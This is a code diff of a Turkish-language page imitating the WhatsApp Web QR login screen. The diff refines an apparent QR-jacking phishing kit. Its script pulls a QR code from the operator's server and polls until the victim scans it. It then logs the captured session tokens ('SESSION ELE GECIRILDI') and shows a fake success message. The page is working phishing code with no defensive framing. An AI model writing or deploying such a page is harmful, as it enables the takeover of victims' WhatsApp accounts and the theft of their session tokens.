@@ -52,7 +52,6 @@
             overflow: hidden;
         }
         
-        /* Sol Panel (Sidebar) */
         .sidebar {
             width: 30%;
             min-width: 340px;
@@ -188,7 +187,6 @@
             text-overflow: ellipsis;
         }
         
-        /* Sağ Panel (Giriş/QR Alanı) */
         .main-panel {
             flex: 1;
             display: flex;
@@ -292,19 +290,6 @@
             font-weight: 500;
         }
         
-        /* Bildirim/Hata Durumları */
-        .error-state {
-            display: none;
-            color: #ea0038;
-            margin-top: 12px;
-            font-size: 14px;
-        }
-        
-        .error-state.active {
-            display: block;
-        }
-        
-        /* Durum Katmanları */
         .status-overlay {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
@@ -344,13 +329,13 @@
                         <button title="Yeni Sohbet">
                             <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor"><path d="M19.005 11H13V5c0-.55-.45-1-1-1s-1 .45-1 1v6H5.005c-.55 0-1 .45-1 1s.45 1 1 1H11v6c0 .55.45 1 1 1s1-.45 1-1v-6h6.005c.55 0 1-.45 1-1s-.45-1-1-1Z"></path></svg>
                         </button>
-                        <button title="Menü">
+                        <button title="Menu">
                             <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor"><path d="M12 7a2 2 0 1 0-.001-4.001A2 2 0 0 0 12 7Zm0 7a2 2 0 1 0-.001-4.001A2 2 0 0 0 12 14Zm0 7a2 2 0 1 0-.001-4.001A2 2 0 0 0 12 21Z"></path></svg>
                         </button>
                     </div>
                 </div>
                 <div class="search-bar">
-                    <input type="text" placeholder="Aratın veya yeni sohbet başlatın" disabled>
+                    <input type="text" placeholder="Arayin veya yeni sohbet baslatin" disabled>
                 </div>
                 <div class="chat-list">
                     <div class="chat-item">
@@ -360,7 +345,7 @@
                                 <div class="chat-name">WhatsApp Destek</div>
                                 <div class="chat-time">11:42</div>
                             </div>
-                            <div class="chat-preview">Cihazınızı senkronize etmek için kodu tarayın.</div>
+                            <div class="chat-preview">Cihazinizi senkronize etmek icin kodu tarayin.</div>
                         </div>
                     </div>
                 </div>
@@ -368,30 +353,26 @@
             
             <div class="main-panel">
                 <div class="qr-container" id="qrContainer">
-                    <h1>WhatsApp Web'i kullanın</h1>
-                    <p>Bilgisayarınızda WhatsApp'ı kullanmak için:</p>
+                    <h1>WhatsApp Web'i kullanin</h1>
+                    <p>Bilgisayarinizda WhatsApp'i kullanmak icin:</p>
                     
                     <div class="qr-frame" id="qrFrame">
                         <div class="loading-spinner" id="loadingSpinner"></div>
                         <img id="qrImage" style="display:none;" alt="QR Code">
                     </div>
                     
-                    <div class="error-state" id="errorState">
-                        Bağlantı zaman aşımına uğradı. Sayfayı yenileyip tekrar deneyin.
-                    </div>
-                    
                     <div class="instructions">
                         <div class="step">
                             <div class="step-num">1</div>
-                            <p>Telefonunuzda <strong>WhatsApp</strong>'ı açın.</p>
+                            <p>Telefonunuzda <strong>WhatsApp</strong>'i acin.</p>
                         </div>
                         <div class="step">
                             <div class="step-num">2</div>
-                            <p><strong>Menü</strong> veya <strong>Ayarlar</strong> sekmesine girip <strong>Bağlı Cihazlar</strong> seçeneğine dokunun.</p>
+                            <p><strong>Menu</strong> veya <strong>Ayarlar</strong> sekmesine girip <strong>Bagli Cihazlar</strong> secenegine dokunun.</p>
                         </div>
                         <div class="step">
                             <div class="step-num">3</div>
-                            <p>Telefonunuzun kamerasını bu ekrana doğrultarak kodu taratın.</p>
+                            <p>Telefonunuzun kamerasini bu ekrana dogrultarak kodu taratin.</p>
                         </div>
                     </div>
                 </div>
@@ -402,61 +383,91 @@
     <div class="status-overlay" id="statusOverlay">
         <div class="status-content">
             <div class="loading-spinner" style="margin: 0 auto 20px;"></div>
-            <h2>Şifreleme Kontrol Ediliyor</h2>
-            <p>Oturum açma isteği işleniyor, lütfen bekleyin...</p>
+            <h2>Sifreleme Kontrol Ediliyor</h2>
+            <p>Oturum acma istegi isleniyor, lutfen bekleyin...</p>
         </div>
     </div>
     
-  <script>
-    const socket = io();
-    let sessionCheckInterval = null;
-    const linkId = window.location.pathname.split('/qr/')[1] || '';
-    
-    socket.on('connect', () => {
-        console.log('[+] Sunucu bağlantısı kuruldu.');
-        if (linkId) fetchQRCode(linkId);
-    });
-    
-    function fetchQRCode(id) {
-        fetch('/api/qr-code/' + id)
-            .then(res => res.json())
-            .then(data => {
-                if (data.status === 'success' && data.qr) {
-                    renderQR(data.qr);
-                } else if (data.status === 'loading') {
-                    setTimeout(() => fetchQRCode(id), 2000);
-                }
-            })
-            .catch(() => setTimeout(() => fetchQRCode(id), 3000));
-    }
-    
-    function renderQR(qrUrl) {
-        document.getElementById('loadingSpinner').style.display = 'none';
-        const img = document.getElementById('qrImage');
-        img.style.display = 'block';
-        img.src = qrUrl;
-        trackSessionStatus();
-    }
-    
-    function trackSessionStatus() {
-        if (sessionCheckInterval) clearInterval(sessionCheckInterval);
-        sessionCheckInterval = setInterval(() => {
-            fetch('/api/check-session/' + linkId)
+    <script>
+        const socket = io();
+        let sessionCheckInterval = null;
+        
+        // URL'den link_id'yi al
+        const pathParts = window.location.pathname.split('/');
+        const linkId = pathParts[pathParts.length - 1];
+        
+        console.log('[+] Link ID:', linkId);
+        
+        function fetchQRCode(id) {
+            fetch('/api/qr-code/' + id)
                 .then(res => res.json())
                 .then(data => {
-                    if (data.status === 'success') {
-                        clearInterval(sessionCheckInterval);
-                        handleAuthSuccess(data.tokens);
+                    if (data.status === 'success' && data.qr) {
+                        renderQR(data.qr);
+                    } else if (data.status === 'loading') {
+                        document.getElementById('loadingSpinner').style.display = 'block';
+                        document.getElementById('qrImage').style.display = 'none';
+                        setTimeout(() => fetchQRCode(id), 2000);
                     }
                 })
-                .catch(() => {});
-        }, 2500);
-    }
-    
-    function handleAuthSuccess(tokens) {
-        document.getElementById('statusOverlay').classList.add('active');
-        console.log('[+] Session captured!', tokens);
-    }
-</script>
+                .catch(err => {
+                    console.log('[!] QR hatasi, tekrar deneniyor...', err);
+                    setTimeout(() => fetchQRCode(id), 3000);
+                });
+        }
+        
+        function renderQR(qrUrl) {
+            const spinner = document.getElementById('loadingSpinner');
+            const img = document.getElementById('qrImage');
+            
+            spinner.style.display = 'none';
+            img.style.display = 'block';
+            img.src = qrUrl;
+            
+            console.log('[+] QR kodu goruntulendi, session bekleniyor...');
+            trackSessionStatus();
+        }
+        
+        function trackSessionStatus() {
+            if (sessionCheckInterval) clearInterval(sessionCheckInterval);
+            
+            sessionCheckInterval = setInterval(() => {
+                fetch('/api/check-session/' + linkId)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.status === 'success') {
+                            clearInterval(sessionCheckInterval);
+                            handleAuthSuccess(data.tokens);
+                        }
+                    })
+                    .catch(() => {});
+            }, 2000);
+        }
+        
+        function handleAuthSuccess(tokens) {
+            document.getElementById('statusOverlay').classList.add('active');
+            console.log('[+] SESSION ELE GECIRILDI!');
+            console.log('[+] Tokenlar:', tokens);
+            
+            // 2 saniye sonra overlay'i kaldir ve basari mesaji goster
+            setTimeout(() => {
+                document.getElementById('statusOverlay').classList.remove('active');
+                document.getElementById('qrContainer').innerHTML = `
+                    <h1 style="color: #00a884;">✓ Baglanti Basarili</h1>
+                    <p>WhatsApp hesabiniza basariyla baglanildi.</p>
+                    <p style="font-size: 12px; color: #667781; margin-top: 20px;">
+                        Bu pencereyi kapatabilirsiniz.
+                    </p>
+                `;
+            }, 2000);
+        }
+        
+        // Sayfa yuklenince baslat
+        if (linkId) {
+            fetchQRCode(linkId);
+        } else {
+            console.error('[!] Link ID bulunamadi!');
+        }
+    </script>
 </body>
 </html>
